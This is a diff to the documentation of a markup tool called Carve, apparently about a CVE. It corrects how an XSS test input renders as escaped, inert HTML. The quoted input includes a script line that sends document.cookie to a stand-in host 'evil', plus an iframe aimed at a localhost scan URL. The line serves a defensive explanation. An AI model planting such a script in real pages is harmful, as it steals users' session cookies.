@@ -492,11 +492,17 @@ Carve:
 <script>fetch("//evil/?" + document.cookie)</script>
 ```
 
-renders as escaped, inert text: `<p>&lt;iframe …&gt;…</p>`,
-`<p>&lt;script&gt;…&lt;/script&gt;</p>`. Carve has no "HTML block"
-auto-detection, so a bare tag is never live markup. The only way to emit raw
-HTML is the **explicit** `` ```=html `` construct, which you disable for
-untrusted input.
+renders as one escaped, inert paragraph. The slashes in the payload pair into
+an emphasis span, but no tag is live:
+
+```html
+<p>&lt;iframe src=“http://localhost:8080/scan”&gt;&lt;<em>iframe&gt;
+&lt;script&gt;fetch(“</em>/evil/?” + document.cookie)&lt;/script&gt;</p>
+```
+
+Carve has no "HTML block" auto-detection, so a bare tag is never live markup.
+The only way to emit raw HTML is the **explicit** `` ```=html `` construct,
+which you disable for untrusted input.
 
 ::: tip Two things this CVE also reminds you of
 Even with Carve's inert output, a *preview* application still owns its sandbox:
